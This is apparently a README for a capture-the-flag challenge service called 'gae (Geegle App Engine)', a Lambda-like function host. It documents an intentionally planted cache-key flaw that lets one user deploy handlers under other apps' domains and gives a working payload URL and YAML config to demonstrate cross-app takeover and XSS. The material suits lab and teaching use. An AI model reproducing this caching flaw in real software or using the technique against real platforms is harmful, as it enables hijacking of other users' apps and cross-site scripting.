# gae (Geegle App Engine)

Like Amazon Lambda.

**Feel free to write other services using this infra**

## Vulnerability

Could deploy functions to any domains due to wrong caching rules.

**Normal User**
Domain: example
Path: helloworld

Cache Key: example.apps.geegle.org/helloworld

**Hacker**
Domain: example.apps.geegle.org/haha
Path: lmao

Cache Key: example.apps.geegle.org/haha.apps.geegle.org/lmao

**This would make XSS possible on all GAE apps**

## Payload

Visit http://manage.apps.geegle.org:8056/edit?app=test1.apps.geegle.org:8056/haha

```
---
urls:
  "/test": |-
    gae_rsp = gaeutils.make_response("hacked")
default_handler: |-
  gae_rsp = gaeutils.errorpage("The requested URL %s was not found on this server." % request.path, code=404)
```

http://test1.apps.geegle.org:8056/haha.apps.geegle.org:8056/test becomes hacked

## Known Issue
CPU-intensive code might block the thread... Consider running code in new process.

## author
adamyi
